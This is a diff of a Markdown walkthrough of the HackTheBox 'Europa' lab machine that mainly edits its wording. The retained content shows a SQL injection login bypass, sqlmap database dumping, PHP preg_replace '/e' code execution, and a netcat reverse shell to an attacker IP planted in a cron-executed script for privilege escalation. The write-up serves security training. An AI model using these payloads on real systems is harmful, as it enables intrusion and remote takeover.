@@ -72,15 +72,13 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-`https://www.europacorp.htb` brings us to an apache default page. 
-
-However, `https://admin-portal.europacorp.htb` brings us to a login page!
+`https://www.europacorp.htb` brings us to an Apache default page. However, `https://admin-portal.europacorp.htb` brings us to a login page!
 
 ![login_page](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Europa/login_page.png?raw=true)
 
 ### SQL Injection - First Method
 
-Firstly, I used Burp Suite to intercept the login request.
+Used Burp Suite to intercept the login request.
 
 ```http
 POST /login.php HTTP/1.1
@@ -110,7 +108,7 @@ email=admin%40europacorp.htb&password=password
 
 Then I sent the request to Burp’s Repeater and tried some SQL syntax.
 
-Upon using `'`, I realized that the server returned an SQL error.
+Upon using `'`, I realized that the server returned an SQL error. This indicates possible SQLi vulnerability.
 
 ```http
 HTTP Request
@@ -122,7 +120,7 @@ HTTP Response
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '5f4dcc3b5aa765d61d8327deb882cf99'' at line 1
 ```
 
-This prompted me to try some basic SQL injection techniques and `’-- -` or `’;-- -` worked.
+Basic SQL injection techniques and `’-- -` or `’;-- -` worked.
 
 ```http
 HTTP Request
@@ -143,8 +141,6 @@ Content-Type: text/html; charset=UTF-8
 ```
 
 ### SQLMap - Second Method
-
-To use `sqlmap`, we have to intercept the login request first using Burp Suite.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Europa]
@@ -172,8 +168,6 @@ Parameter: email (POST)
 
 It looks like `sqlmap` found 3 ways to bypass the login.
 
-Now, lets ask `sqlmap` to list out the databases.
-
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Europa]
 └─# sqlmap -r login_request.txt --batch --force-ssl --dbs
@@ -183,8 +177,6 @@ available databases [2]:
 [*] information_schema
 ...
 ```
-
-Now, lets list the admin table.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Europa]
@@ -197,8 +189,6 @@ Database: admin
 +-------+
 ...
 ```
-
-Finally, lets dump the users table.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Europa]
@@ -224,11 +214,11 @@ Using Hashes.com, we find out that the password is `SuperSecretPassword!`.
 
 # Exploitation
 
-After logging in, the dashboard looks like this.
+Here is the admin dashboard.
 
 ![admin_dashboard](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Europa/admin_dashboard.png?raw=true)
 
-The Tools page has an interesting OpenVPN Config Generator.
+The Tools page has an OpenVPN Config Generator.
 
 ![tools_page](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Europa/tools_page.png?raw=true)
 
@@ -239,28 +229,13 @@ POST /tools.php HTTP/1.1
 Host: admin-portal.europacorp.htb
 Cookie: PHPSESSID=bf3oqpkbh8rc0oheor1m6ihr40
 Content-Length: 1678
-Cache-Control: max-age=0
-Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
-Sec-Ch-Ua-Mobile: ?0
-Sec-Ch-Ua-Platform: "Linux"
-Upgrade-Insecure-Requests: 1
-Origin: https://admin-portal.europacorp.htb
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Referer: https://admin-portal.europacorp.htb/tools.php
-Accept-Encoding: gzip, deflate
-Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+...
 Connection: close
 
 pattern=%2Fip_address%2F&ipaddress=&text=%22openvpn%22%3A+%7B%0D%0A++++++++%22vtun0%22%3A+%7B%0D%0A++++++++++++++++%22local-address%22%3A+%7B%0D%0A++++++++++++++++++++++++%2210.10.10.1%22%3A+%22%27%27%22%0D%0A++++++++++++++++%7D%2C%0D%0A++++++++++++++++%22local-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22mode%22%3A+%22site-to-site%22%2C%0D%0A++++++++++++++++%22openvpn-option%22%3A+%5B%0D%0A++++++++++++++++++++++++%22--comp-lzo%22%2C%0D%0A++++++++++++++++++++++++%22--float%22%2C%0D%0A++++++++++++++++++++++++%22--ping+10%22%2C%0D%0A++++++++++++++++++++++++%22--ping-restart+20%22%2C%0D%0A++++++++++++++++++++++++%22--ping-timer-rem%22%2C%0D%0A++++++++++++++++++++++++%22--persist-tun%22%2C%0D%0A++++++++++++++++++++++++%22--persist-key%22%2C%0D%0A++++++++++++++++++++++++%22--user+nobody%22%2C%0D%0A++++++++++++++++++++++++%22--group+nogroup%22%0D%0A++++++++++++++++%5D%2C%0D%0A++++++++++++++++%22remote-address%22%3A+%22ip_address%22%2C%0D%0A++++++++++++++++%22remote-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22shared-secret-key-file%22%3A+%22%2Fconfig%2Fauth%2Fsecret%22%0D%0A++++++++%7D%2C%0D%0A++++++++%22protocols%22%3A+%7B%0D%0A++++++++++++++++%22static%22%3A+%7B%0D%0A++++++++++++++++++++++++%22interface-route%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++%22ip_address%2F24%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++%22next-hop-interface%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++++++++++%22vtun0%22%3A+%22%27%27%22%0D%0A++++++++++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++%7D%0D%0A++++++++++++++++%7D%0D%0A++++++++%7D%0D%0A%7D%0D%0A++++++++++++++++++++++++++++++++
 ```
 
-This seems to be difficult to read so lets URL decode it.
+The payload is URL encoded. Here is the URL decoded payload.
 
 ```bash
 pattern=/ip_address/&ipaddress=&text="openvpn": {
@@ -299,11 +274,7 @@ pattern=/ip_address/&ipaddress=&text="openvpn": {
 }
 ```
 
-Ah.. much better. It looks like the request is looking for some pattern?
-
-Doing a quick Google search on `PHP regex exploit` brings me to this [article](https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4).
-
-It seems like we can just add an `e` modifier to the regular expression/pattern to execute a `PHP` code.
+The payload appears to be looking for some regex pattern. Doing a quick Google search on `PHP regex exploit` results to this [article](https://captainnoob.medium.com/command-execution-preg-replace-php-function-exploit-62d6f746bda4). It seems like we can an `e` modifier to the regex/pattern to execute a `PHP` code.
 
 Let’s modify our request to something like this: `pattern=/ip_address/e&ipaddress=system('id')&text=...`
 
@@ -319,9 +290,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ...
 ```
 
-Yay! We managed to execute some PHP code.
-
-Now, lets send a reverse netcat shell code.
+Nice, we executed some PHP code. Now, we can send a reverse (url encoded) reverse shell command.
 
 ```bash
 Reverse netcat shell code (non-URL encoded)
@@ -347,16 +316,7 @@ www-data
 
 # Privilege Escalation
 
-Let’s use Linpeas to find out if there is anything we can exploit to gain privilege escalation.
-
 ```bash
-- Local machine -
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/Europa]
-└─# python3 -m http.server 80           
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.10.22 - - [09/May/2022 11:14:15] "GET /linpeas.sh HTTP/1.1" 200 -
-
-- Netcat listener -
 $ wget http://10.10.14.8/linpeas.sh
 $ chmod +x linpeas.sh
 $ ./linpeas.sh
@@ -371,10 +331,11 @@ port /etc/cron.weekly )
 ...
 ```
 
-There seems to be an interesting cronjob running called `clearlogs`!
+There an interesting cronjob running called `clearlogs`!
 
 ```bash
 $ cat /var/www/cronjobs/clearlogs
+
 #!/usr/bin/php
 <?php
 $file = '/var/www/admin/logs/access.log';
@@ -383,9 +344,7 @@ exec('/var/www/cmd/logcleared.sh');
 ?>
 ```
 
-Hmm? It looks like its executing some `logcleared.sh` script but the file does not exist.
-
-Perhaps, we can write our own malicious `logcleared.sh` file? OwO
+The cronjob is executing some `logcleared.sh` script but the file does not exist. We can leverage this by writing our own malicious `logcleared.sh` file.
 
 ```bash
 $ echo 'rm /tmp/f2;mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i 2>&1|nc 10.10.14.8 9999 >/tmp/f2' > /var/www/cmd/logcleared.sh
@@ -394,9 +353,9 @@ rm /tmp/f2;mkfifo /tmp/f2;cat /tmp/f2|/bin/sh -i 2>&1|nc 10.10.14.8 9999 >/tmp/f
 $ chmod +x /var/www/cmd/logcleared.sh
 ```
 
->   Note: As we are currently using the variable `f` for the current user shell, we cannot reuse it. Therefore, we need to use another variable - `f2`.
+>   Note: As we are currently using the variable `f` for the current user shell, we cannot reuse it. Therefore, we need to use another variable `f2`.
 
-Finally, we wait for the cronjob to execute in our netcat listener.
+Finally, we wait for the cronjob to execute our malicious code.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Europa]
